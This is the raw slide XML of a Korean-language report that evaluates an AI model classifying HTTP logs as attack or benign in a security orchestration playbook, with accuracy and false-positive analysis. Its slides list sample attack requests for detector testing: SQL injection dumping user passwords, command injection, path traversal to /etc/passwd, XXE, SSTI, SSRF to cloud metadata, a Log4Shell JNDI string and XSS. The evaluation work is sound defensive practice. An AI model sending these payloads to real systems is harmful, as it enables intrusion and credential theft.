Id="R03549db6d9754a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78596664f44d4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="Rf4c0b436a9f943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7fa21fb14813" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R306a7496cb3148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599c4ae4d452b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="R0d3717244b3d41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94d79b0bf4569" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide20.xml" Id="R817fc0ee9c8e49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c6fea9cb54bf6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide21.xml" Id="Rfb6816c25fd04d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124ee6ba64ec7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide22.xml" Id="Rf1781413e3a44e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8c2574c0415f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide23.xml" Id="Reb4b7ee4f9ff48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4bd182249464c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide24.xml" Id="Rb58cb5199ad642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1efc8d8514092" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide25.xml" Id="R9a19e50b194a4c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화면 값</c:v>
          </c:tx>
          <c:dPt>
            <c:idx val="0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cat>
            <c:strRef>
              <c:f>'Chart Data'!$A$2:$A$21</c:f>
              <c:strCache>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>S01</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>S02</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>S03</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>S04</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>S05</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>S06</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>S07</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>S08</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>S09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S17</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>S18</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>S19</c:v>
                </c:pt>
                <c:pt idx="19">
                  <c:v>S20</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Chart Data'!$B$2:$B$21</c:f>
              <c:numCache>
                <c:formatCode>0.00</c:formatCode>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>0.47</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.39</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.48</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.3</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>0.31</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>0.35</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>0.27</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>0.65</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>0.46</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>0.37</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>0.67</c:v>
                </c:pt>
                <c:pt idx="14">
                  <c:v>0.51</c:v>
                </c:pt>
                <c:pt idx="15">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="16">
                  <c:v>0.63</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>0.45</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>0.57</c:v>
                </c:pt>
                <c:pt idx="19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246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7FA"/>
        </a:solidFill>
      </c:spPr>
    </c:plotArea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0CEC-6FE5-4DD4-AB62-653FC717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rPr>
              <a:t>eyeCloudXOAR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305FA-33FC-4182-B81E-4C1817B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86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정오탐 탐지 모델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샘플로그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05094-AA2F-43AB-AD3A-4E2696F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LogGenerator 연동 및 AI TEST 플레이북 실행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6CBBE-5CB8-4436-928F-CD22A78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52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테스트 기록  2026.09.08</a:t>
            </a:r>
          </a:p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대상 서버  10.1.42.80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1483750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66F44-CFD8-4DEC-9CE1-F27F0CF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10건을 탐지했고 정상 6건을 공격으로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8891E-C885-4EAA-BE73-6D8D23A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10건, 정상 대조군 10건에 대한 사후 수동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228-DC67-41FF-B0FB-2B510BF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DD12C-E13E-4F78-98D8-1266F6E3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70.0%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FA715-5391-4328-A653-1FE643F8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전체 정확도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BF737-8060-42EC-A697-50BBDAC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20건 중 14건 정분류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4DD85-F807-4D61-8871-E197A66A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3E47-A639-4E93-A4CE-3947C40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탐지율 /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8ED7-14FB-4CA3-BEBE-A0885B3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모사 10건 중 10건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5F8D7-4D66-4BE1-9C67-531FDF4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96540-F034-4BF7-9360-1F889D5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판정 정밀도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D2F7C-703A-4312-AC95-DF280AE1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판정 16건 중 실제 공격 10건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7EC8C-0ABB-4FB8-80F6-502580C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정상 대조군 오탐률 60.0%  (6 / 10)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CF8FA-96CE-4F4D-B8CC-A778B53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 수치는 제공된 20건의 결과이며, 학습·평가 데이터 분리 여부와 운영 환경의 일반화 성능은 확인되지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272876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8A370-DCE4-408C-A6FB-CF96FF03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평가 대상과 수동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E1EB0-E5DB-4014-915A-9484B2E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화면의 공격·정상 판정과 독립적인 기준으로 20개 요청을 다시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F2BFE-C4C6-44EB-9382-6D5820A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EFDC4-B8E7-4DCC-A6A4-145D5D32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152C0-FDE9-44C7-86B0-21667EA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 순서대로 S01~S20을 부여한 HTTP 요청 20건.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각 요청의 화면 값과 공격·정상 판정을 그대로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34F31-6F3B-4884-AD25-3D99267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정상 로그 10건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C1827-AD0F-4B20-98BB-8B1C742B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S01~S10은 제공된 요청 범위에서 공격 구문이 없는 대조군.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업로드 파일 본문, 로그인 응답, 반복 행위는 확인되지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0BBB9-ED88-4F3B-8737-B7F4D7B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로그 10건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6A549-5F92-48D5-89F8-F5C0C09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S11~S20은 삽입, 경로 순회, 외부 접근 등을 시도·모사하는 패턴.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실제 취약점 악용 성공 여부는 이 자료의 평가 대상에 포함하지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46B75-CA14-48EF-B7D7-945DBEC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원문 표기를 보존한다. % 인코딩, \r\n, \*, ldap\://와 Referer의 Markdown 링크 표기는 임의로 교정하지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62926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45D4-B33D-4CA7-8175-1069120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기존 테스트의 연동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9EDEC-3E5F-4960-9C97-DB9CB9C3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사용자 설명에 따른 구성 명칭과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0B9E-D966-4453-96A6-84565FE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38684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8629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과정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후 판정을 확인할 샘플 로그를 선택하고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10.1.42.80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서버의 로그 수신 경로로 전달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 파서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로그를 파싱하고 AI 입력에 필요한 payload를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이벤트  AITEST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로그를 일반 이벤트로 연동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플레이북 티켓  AI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정오탐 분석을 실행하고 피드백 저장 단계로 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6151B-3319-40ED-B50F-BEA99343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대상 서버와 구성 명칭은 제공 내용 기준. 실제 전송 프로토콜·포트·EPS·수신 건수는 제공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2077408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888CF-4298-4599-8F0C-9EF1AACE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파서와 이벤트·티켓 연계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B98E-87EA-4E0D-8601-DD26B28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연동 이름과 분석 입력을 구분해 테스트 조건을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72979-D3D9-4E2D-968E-F75F6D0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1604-CB71-4EBB-B99E-181C921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수신 로그 파싱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A6788-D7D3-44EC-B62F-42EAF50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등록 이름  LogGenerator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요청이 포함된 payload와 이벤트 연동 필드를 추출한다.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E8C03-1776-4181-814F-B3FD4343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이벤트 및 티켓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4E13B-F5F7-43A5-B57B-730C090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일반 이벤트  AITEST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플레이북 티켓  AI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D505A-EE17-43C7-93BA-A264288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AI 분석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84FA8-C9AB-44FD-998C-74157B22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티켓의 payload를 정오탐 분석 요청에 전달한다.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정답 라벨과 보고서용 S번호는 모델 입력에서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366A0-83A4-4651-BBCB-ACB6D0A8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파서 정규식, 장비 매핑, 이벤트 조건식, 활성 모델 버전 및 실제 입력 전문은 별도 설정 증거가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701140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2D73F-0C50-4587-A52E-DCF27D8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플레이북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58447-26CF-4637-AF8F-953A55B0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화면의 노드 이름과 자동·수동 실행 모드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D6D5A-17ED-4BAA-89CE-66AABE7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2d1f35f1f4e12"/>
          <a:stretch xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:off x="733536" y="2324100"/>
            <a:ext cx="13772928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4F17-3EE7-4FBC-8272-7450EBD6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정오탐 분석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16C58-CCB2-4E07-9A2C-0616DDD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29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Auto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분석 요청을 자동 실행하는 노드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E6EE6-85B5-4CD3-8E51-8491A3D1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655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정오탐 피드백 데이터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45379-EC3B-4733-82AA-5496231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6553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사용자 피드백을 처리하는 수동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02592-4AE2-44BA-BB1F-C134BC7C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티켓에는 이 단계의 상태가 표시된다. 제공 화면과 목록만으로 피드백 저장 완료 또는 End 도달을 확정할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43125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B6CEA-F899-4A6E-A899-F190B7CD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20건의 실행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DDBE0-44C4-498A-818A-84B01EE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2026.09.08  /  공통 담당자: 미지정  /  상태: 분석/대응 ( 정오탐 피드백 데이터 저장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CF491-7E92-435E-9E5A-C14CB7EE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84CA3-793D-4CAB-AE0B-C9FD381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A   14:18:13 ~ 14:19:07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FF11E-4CDE-4F98-A0AE-320EAF3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B   16:54:54 ~ 16:55:39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6675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714500"/>
              </a:tblGrid>
              <a:tr h="4381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14:19:07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14:18:13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924800" y="2781300"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="66294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14900"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="4381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16:54:54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88B6-8039-4C13-98DD-FB310005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티켓과 개별 로그의 1:1 대응은 미제공. 목록 B의 00000453 미표시만으로 수집 누락이나 실행 실패를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22682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EA95F-D7B2-4C17-91F2-0021ADF7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혼동행렬과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192C0-3840-4026-8C00-B94D3CAC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양성 클래스 = 공격 의도·모사 로그  /  정답 = 본 보고서의 수동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A82A-0E03-4524-8B49-F2E2B15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  <a:gridCol w="1714500"/>
                <a:gridCol w="1333500"/>
              </a:tblGrid>
              <a:tr h="6191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공격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정상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 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 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7143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020050" y="2352675"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="65341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86690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정확도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/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탐지율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판정 정밀도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오탐률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판별률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점수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/ 26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9CE6B-BD7B-43DD-BC45-62ABDA9F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FP: 정상 로그를 공격으로 판정한 6건. FN: 공격 로그를 정상으로 판정한 건수는 이번 표본에서 0건.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1985580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DD464-E3FC-417B-916C-1EACCF4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S01~S05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D8FBA-A18D-4EE6-9BC1-4A18F37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9C4DD-BC52-45B5-B9B3-5813FD3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상대경로 리디렉션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/home으로 이동하는 상대경로이며 외부 URL이나 헤더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업로드 발췌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이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.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로그인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삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을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점검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/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.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검색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union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이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80BC6-EAE2-463A-BD05-665A882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559865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CBB81-0EBA-4F53-A7EB-9CAC051F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S06~S10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83C42-51BC-4462-B609-1FE69DA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A0085-B9DC-4154-9F96-543D890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ping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localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이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파일 다운로드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 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.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문서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script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가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자연어 검색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건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.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목록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ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석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A0DFD-F7E6-432B-B7FD-6C4207FE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783192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3513B-5BBB-4B74-8E33-673B8E0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S11~S15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16FB2-897D-42F8-93C4-4E3F5227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기준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5C683-7ECD-4505-98FB-8846A78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CRLF / 헤더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%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는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XML 외부 엔터티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DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.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템플릿 삽입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중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이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SSRF 모사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URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.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Log4Shell 패턴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User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.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882B7-57AB-4378-93E9-295D28A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672050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412AF-0D8C-44C8-B4B2-3CB90B7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S16~S20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91990-BD34-4CF7-ABD8-4C76C3F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삽입·경로 순회 패턴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6187C-DC94-4B79-86F4-AFF9603D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명령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;id;uname -a를 연결해 추가 OS 명령 실행을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순회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../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.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XSS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&lt;script&gt;alert(1)&lt;/script&gt;를 포함하는 스크립트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지연 SQL 삽입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인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.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SQL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SELECT로 users 테이블의 username과 password 조회를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875C5-3134-4326-8FA3-1D7A457C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3976561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0047B-8DE0-4AD6-AA93-7447A08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화면의 개별 ‘정확도’ 값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D4953-83E2-4407-8601-99CAC1E2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각 로그의 출력값을 그대로 표시. 데이터셋 정확도 70.0%는 별도로 계산한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50092-E02B-4018-B2E8-A72E5D9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38684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2fc4fcc9d240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61ABB-8DD8-477D-A5EA-D50B1896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주황: FP    청록: TP    회색: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31017-B61B-4B6D-81C4-E5BC9C3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0.31도 공격, 0.39는 정상. 0.5 기준으로 판정을 재계산할 근거가 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1458928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C5AE9-12F9-475C-809E-59F8AE51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해석의 한계와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73B7-7771-46D2-A17F-EC69A6E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이번 표본에서는 정상 요청의 오탐 감소가 주요 개선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A45BB-1D6A-4D7F-A563-DA3CFAF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BA1C9-647A-413D-A514-200AAFA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오탐 6건의 재검토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70C72-2B8E-4DBF-BAAF-2642A87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S01·S03·S05·S06·S08·S10을 정상 피드백 후보로 검토한다.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어휘만으로 공격을 추정했는지는 모델 내부 근거가 있어야 확인할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BB573-142D-423A-87E9-64B1D0CC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입력과 결과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A4C26-69CA-48E1-B574-E45BEB92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전송 원문, 파서 payload, 이벤트 ID, 티켓 ID, AI 입력을 연결한다.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모델 버전·전처리·실행 시각을 함께 남겨 같은 조건으로 재평가한다.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E09F-6D8D-420B-BB04-3A8E7FE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581B-57BC-49AC-B526-B9DE92EE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학습에 사용하지 않은 정상·공격 로그로 다시 평가한다.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이번 20건만으로 학습 효과나 운영 환경의 성능 개선을 입증할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05517-27FE-41E2-8F03-9F5DC87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피드백 저장 완료와 재학습 실행·활성화는 별도 증거가 필요하다. 정상과 공격을 함께 재검증해 오탐·미탐 변화를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838137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BE5B4-0988-4043-9D09-E24CD9B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S01 · S02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D5AD2-F9FD-4DA1-9786-20C3A30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BB109-3463-44B5-B568-4EFE978D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B3AA-0639-4CDC-8EA4-042365CD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S01   상대경로 리디렉션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06A7A-681D-4AF6-B28E-F8A4738F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0.47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71FD8-09A1-4F16-B4F1-3E0C907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/redirect?next=%2Fhome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A34AB-C69A-456A-97EE-87A4C62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S02   파일 업로드 발췌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137E8-9665-4FFF-ADD5-85095D7A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0.39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50F2-3DF9-4394-B546-F893A36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/upload HTTP/1.1\r\n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multipart/form-data; boundary=EVALBOUNDARY\r\n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--EVALBOUNDARY\r\n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Content-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-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11.dat"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10770649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C254A-DF8A-45DE-9FB4-C5B06820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S03 · S04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A430D-6A65-4727-BD85-5B3F7FD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331D3-8522-4B21-A4F9-221C845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EE1DB-E2F1-4AAA-A576-D4D57E9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S03   일반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C2370-413F-49FF-A9D4-7A96A10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0.48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89091-6A08-49F1-9AE3-B56D017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/login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username=user01&amp;password=incorrect-password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1DD15-960E-45DF-9530-1F503F7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S04   상태 점검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FC09F-8E19-49AC-85F8-A238066B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0.30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8BA68-28C3-4718-9548-2B5BD0B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/health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host-22\r\n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kube-probe/1.30\r\n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*/*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1766573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87BE1-7D6B-4E2C-A9BD-FB85D48D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S05 · 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4F89F-E7F9-4D18-A2A9-C7A9918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39B9-F47C-45B4-B809-6E6FEB3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58A0F-8140-4237-A738-6DE71402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S05   JSON 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B193A-3875-4BA4-845C-0F83347D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0.31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B245D-E49A-4DEC-BCE6-F5B669B2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/api/search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application/json\r\n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{"operator":"union","fields":["name","department"],"page":1}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EF4C-EE12-474E-A211-E5EAB36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S06   정상 ping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A5CA6-FDDF-4FC8-A688-786A360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0.60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E65-DFB3-46CA-8C09-56922D3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/tools/ping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host=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18408524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23852-E4C6-4324-88EE-B6EE7967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S07 · S08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495FB-6508-4CCB-84FB-2E251D2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FFB55-6096-4631-9EF7-7BE8832D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B9EB0-04C4-478E-AC4F-473EF07C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S07   일반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44347-9800-4F42-9D79-F5BF30D7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0.35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21F3E-9E34-41E7-9446-6EC3EA49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/download?file=quarterly..final.pdf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host-41\r\n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application/pdf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D0E5-D997-4BA4-BA6C-5119BC3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S08   기술 문서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52E27-572F-45D4-87CE-4698EFA0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0.43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85668-C2BF-4030-9014-5C50469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/docs/search?q=HTML%20script%20element%20reference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Referer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19034997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DD12E-766A-4DAF-BFBF-280C3943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S09 · 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646C1-24E7-4A04-AF4E-33F2962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4412E-2E29-435C-A4DF-82CEB5E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42EB-97F6-4A7B-8D3F-039B16EB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S09   자연어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4022A-99AB-4728-93A0-7BA2BE4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0.27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4980C-B9B5-464A-AE6D-F006DE7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/search?q=how%20to%20select%20a%20health%20plan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AB887-8553-47BB-BC77-BF502D1E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S10   상품 목록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D33FA-4295-4E70-A3CB-7A0C4FE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0.65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E3B8-DAEE-4986-83A0-9A76F46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/products?id=10&amp;sort=price&amp;direction=asc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8286961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A210A-434B-4EE6-9DD0-6F4CD32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S11 · S12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A8899-F7BB-42BB-BBF7-34FF0E10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16059-5662-4284-86EB-3591EFAF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A0E75-31A3-453E-87BB-878DDBAB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S11   CRLF / 헤더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78AB2-177C-46C5-9EC5-8E381A6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C888D-939C-44FA-9952-203304EC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/redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true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52A1F-6A29-4B8D-AE50-FC868781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S12   XML 외부 엔터티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32383-2998-4816-83FC-D98DE3D5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0.46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2A249-59F5-446B-8AB4-DF056772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/api/import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application/xml\r\n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%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%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26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19677679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0D7C9-F200-4A6B-990B-DCC4FE7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S13 · S14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30F85-FBEF-403C-8BDB-3ECAEDE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DA60D-6083-4CDA-B19E-ADB8C89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27248-D1A0-4106-B30D-6433257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S13   서버 템플릿 삽입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D098B-A361-41FF-973A-61055AB5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0.37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D9409-9870-4327-8491-63EA3E8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/welcome?name=%7B%7B7\*7%7D%7D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1BE32-E6A1-470E-9F3B-90F06A93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S14   SSRF 모사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307C7-E44E-4E34-AB87-AF670104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0.67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DBCAD-9182-4300-B910-B0E40B61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/preview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host-22\r\n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url=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18708442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09098-B47E-425A-9D44-E5A4037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S15 · S16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C5207-DC4B-4843-87E4-9F8CAD12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EA50B-CB0B-435E-B883-CA69D3E1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E4B96-A1B9-4BE0-94D4-AF5F5987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S15   Log4Shell 패턴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A7418-3BD0-43E8-9B02-A03FBAE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0.51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96B24-69D5-4C85-A276-3A07E06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${jndi:ldap\://192.0.2.123:1389/test-only}\r\n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X-Test-Marker: AI-EVAL-9006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1467B-7EA1-423A-8EC9-FFCA265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S16   OS 명령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3644F-E352-41E6-9DD4-1676B64F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3075F-E41C-42F8-8D28-47FE22E8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/tools/ping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host=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1314071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2D807-6366-43F8-AEE6-4B8E604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S17 · S18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A2968-D214-49DE-B1BD-9A1C4EE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E4BCF-20A3-40CA-8C2D-417276A5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6C4E8-3A6B-4586-B1BD-918DBD7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S17   경로 순회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14612-5A98-4A38-9822-DD6EA3C0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2A0B5-2143-4449-8F03-EC646CD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/download?file=../../../../etc/passwd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host-41\r\n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application/octet-stream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6BE5-E5C8-463E-B0BC-D425F13D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S18   XSS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8DA78-5DCC-44D1-8834-B88BF805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0.45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EFB7D-319F-41BC-81A5-AFCFF21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/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E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Referer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21381443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C4C94-1370-484B-9DB4-62A15DE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S19 · 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FD517-CA7E-4AA1-8AB4-91D297A7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A98A6-E2F5-4851-9BF6-4EE6F41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2FA77-BD73-45DA-B2A5-17CB115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S19   시간 지연 SQL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D9819-6A3E-4E60-98D8-2BAB24A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266AE-9CE4-4EA2-ADCF-67D2137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/login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username=admin%27%20AND%20SLEEP%285%29--&amp;password=test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B116E-48BD-45A2-BD07-3276CA5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S20   UNION SQL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EA6E8-5F9D-459B-A874-BA5D8BB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1.00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6E949-2AFE-41E9-AD27-DF7C2260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/products?id=10%20UNION%20SELECT%20username,password%20FROM%20users--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2445232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EAF66-889F-4E14-A909-CC254AB8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근거 자료와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8C61E-AF80-4CB5-8BA5-93D32D3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판정 근거, 계산 결과, 제품 동작 설명의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EBEE-004F-4C57-AC07-B50E9BD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3CEE4-75B9-4163-A5F3-3C73F63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직접 제공한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FE4BE-341A-4DB1-90B3-D67AF50F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요청·화면 값·모델 판정 20건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목록 20건과 플레이북 화면 1장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A268B-387C-4839-8D4B-17178ADC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제품 동작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93ACE-DABE-486A-86AA-39AD4FA8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LogGenerator 현재 README의 로그 전송 절차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eyeCloudXOAR v4 사용자 매뉴얼과 플레이북 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EABBE-10EF-4B26-A314-59EDE29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유형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05CDB-EA80-42CE-B2B3-668A2868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OWASP의 SQL·명령·XML·템플릿 삽입 및 경로 순회 자료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Apache Log4j 보안 공지, RFC 5737, Kubernetes Probe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49150-82C1-40CB-BCAB-12B7013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01B0D-B229-446E-8DCD-3376CD0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1026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제공된 기록의 사후 분석. 서버 수신, 설정 저장, 티켓별 로그 매핑,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피드백 DB 반영과 재학습 완료는 직접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530520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2026-09-09T03:16:08.7440000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-09T03:16:08.7450000Z</dcterms:modified>
</coreProperties>
</file>